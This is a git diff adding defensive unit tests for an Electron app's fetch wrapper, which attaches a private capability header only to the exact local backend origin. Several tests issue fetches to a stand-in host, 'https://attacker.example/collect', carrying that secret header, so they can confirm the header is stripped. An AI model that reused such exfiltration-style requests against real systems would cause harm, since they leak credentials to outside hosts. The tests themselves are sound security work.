@@ -14,11 +14,19 @@
 // ══════════════════════════════════════════════════════════════════════════════
 
 import { suite, test, testAsync, assert, assertEqual, assertThrows, summary } from './harness.js';
+import { createRequire } from 'node:module';
 import Database from 'better-sqlite3';
 import { UpgradeManager } from '../src/upgrade/upgrade-manager.js';
 import { config } from '../src/config.js';
 
 const ASYNC_TEST_TIMEOUT_MS = 10_000;
+const require = createRequire(import.meta.url);
+const {
+  LEGACY_LOCAL_CAPABILITY_HEADER,
+  installLegacyLocalFetch,
+} = require(
+  '../c3-ide/applications/electron/c3-local-http-bootstrap.js',
+);
 
 // ─── Test DB Setup ──────────────────────────────────────────────────────────
 
@@ -716,6 +724,176 @@ test('FE _backendBase discovery pattern (window.electronC3)', () => {
     return 'http://127.0.0.1:3335';
   })(globalObj);
   assertEqual(nullCase, 'http://127.0.0.1:3335');
+});
+
+function createLocalFetchScope(getLocalAccess) {
+  const calls = [];
+  const scope = {
+    Headers,
+    Request,
+    URL,
+    location: { href: 'file:///opt/intentsmith/index.html' },
+    electronC3: { getLocalAccess },
+    fetch: async function nativeFetch(...args) {
+      calls.push(args);
+      return { ok: true, status: 200 };
+    },
+  };
+  return { calls, scope };
+}
+
+await testAsync('Electron local fetch authorizes only the exact backend origin', async () => {
+  const capability = 'A'.repeat(43);
+  let metadataReads = 0;
+  const { calls, scope } = createLocalFetchScope(() => {
+    metadataReads++;
+    return {
+      backendUrl: 'http://127.0.0.1:45678',
+      localCapability: capability,
+    };
+  });
+
+  assertEqual(installLegacyLocalFetch(scope), true);
+  assertEqual(installLegacyLocalFetch(scope), false, 'bootstrap must be idempotent');
+
+  const controller = new AbortController();
+  await scope.fetch('/api/settings', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      [LEGACY_LOCAL_CAPABILITY_HEADER]: 'caller-controlled-value',
+    },
+    body: '{"enabled":true}',
+    signal: controller.signal,
+  });
+
+  assertEqual(metadataReads, 1, 'one request must use one atomic metadata snapshot');
+  assertEqual(calls.length, 1);
+  const request = calls[0][0];
+  assert(request instanceof Request, 'authorized fetch must use a Request');
+  assertEqual(request.url, 'http://127.0.0.1:45678/api/settings');
+  assertEqual(request.method, 'POST');
+  assertEqual(request.headers.get('content-type'), 'application/json');
+  assertEqual(
+    request.headers.get(LEGACY_LOCAL_CAPABILITY_HEADER),
+    capability,
+    'current private capability must overwrite caller input',
+  );
+  assertEqual(request.redirect, 'error', 'local redirects must not forward capability');
+  assertEqual(await request.text(), '{"enabled":true}');
+  assertEqual(request.signal.aborted, false);
+  controller.abort();
+  assertEqual(request.signal.aborted, true, 'authorized request must retain abort propagation');
+});
+
+await testAsync('Electron local fetch preserves Request inputs and strips foreign capability headers', async () => {
+  const capability = 'B'.repeat(43);
+  const { calls, scope } = createLocalFetchScope(() => ({
+    backendUrl: 'http://127.0.0.1:45678',
+    localCapability: capability,
+  }));
+  installLegacyLocalFetch(scope);
+
+  const input = new Request(
+    'http://127.0.0.1:45678/chat',
+    {
+      method: 'POST',
+      headers: { 'X-Existing': 'preserved' },
+      body: 'request-body',
+    },
+  );
+  await scope.fetch(input);
+  const authorized = calls[0][0];
+  assertEqual(authorized.method, 'POST');
+  assertEqual(authorized.headers.get('x-existing'), 'preserved');
+  assertEqual(
+    authorized.headers.get(LEGACY_LOCAL_CAPABILITY_HEADER),
+    capability,
+  );
+  assertEqual(await authorized.text(), 'request-body');
+
+  await scope.fetch('https://attacker.example/collect', {
+    headers: {
+      [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
+      'X-Safe': 'kept',
+    },
+  });
+  const foreign = calls[1][0];
+  assert(foreign instanceof Request, 'foreign secret stripping must use a sanitized Request');
+  assertEqual(foreign.url, 'https://attacker.example/collect');
+  assertEqual(foreign.headers.has(LEGACY_LOCAL_CAPABILITY_HEADER), false);
+  assertEqual(foreign.headers.get('x-safe'), 'kept');
+});
+
+await testAsync('Electron local fetch never authorizes lookalike local origins', async () => {
+  const capability = 'C'.repeat(43);
+  const { calls, scope } = createLocalFetchScope(() => ({
+    backendUrl: 'http://127.0.0.1:45678',
+    localCapability: capability,
+  }));
+  installLegacyLocalFetch(scope);
+
+  const lookalikes = [
+    'http://localhost:45678/api/system/info',
+    'http://127.0.0.1:45679/api/system/info',
+    'https://127.0.0.1:45678/api/system/info',
+    'https://attacker.example/?next=http://127.0.0.1:45678',
+  ];
+  for (const target of lookalikes) {
+    await scope.fetch(target);
+  }
+
+  assertEqual(calls.length, lookalikes.length);
+  for (let index = 0; index < lookalikes.length; index++) {
+    assertEqual(calls[index][0], lookalikes[index]);
+    assertEqual(calls[index][1], undefined);
+  }
+});
+
+await testAsync('Electron local fetch fails closed for relative API calls without valid metadata', async () => {
+  for (const metadata of [
+    null,
+    {
+      backendUrl: 'http://127.0.0.1:45678',
+      localCapability: 'too-short',
+    },
+    {
+      backendUrl: 'https://127.0.0.1:45678',
+      localCapability: 'D'.repeat(43),
+    },
+  ]) {
+    let metadataReads = 0;
+    const { calls, scope } = createLocalFetchScope(() => {
+      metadataReads++;
+      return metadata;
+    });
+    installLegacyLocalFetch(scope);
+    let rejected = false;
+    try {
+      await scope.fetch('/api/system/info');
+    } catch (error) {
+      rejected = error instanceof TypeError
+        && /capability is unavailable/.test(error.message);
+    }
+    assert(rejected, 'relative API request must reject without valid private metadata');
+    assertEqual(metadataReads, 1);
+    assertEqual(calls.length, 0, 'invalid metadata must not reach native fetch');
+  }
+});
+
+await testAsync('Electron local fetch canonicalizes the explicit default HTTP port', async () => {
+  const capability = 'E'.repeat(43);
+  const { calls, scope } = createLocalFetchScope(() => ({
+    backendUrl: 'http://127.0.0.1:80',
+    localCapability: capability,
+  }));
+  installLegacyLocalFetch(scope);
+  await scope.fetch('http://127.0.0.1/api/health');
+  assertEqual(calls.length, 1);
+  assertEqual(
+    calls[0][0].headers.get(LEGACY_LOCAL_CAPABILITY_HEADER),
+    capability,
+  );
 });
 
 test('C3_READY stdout format', () => {
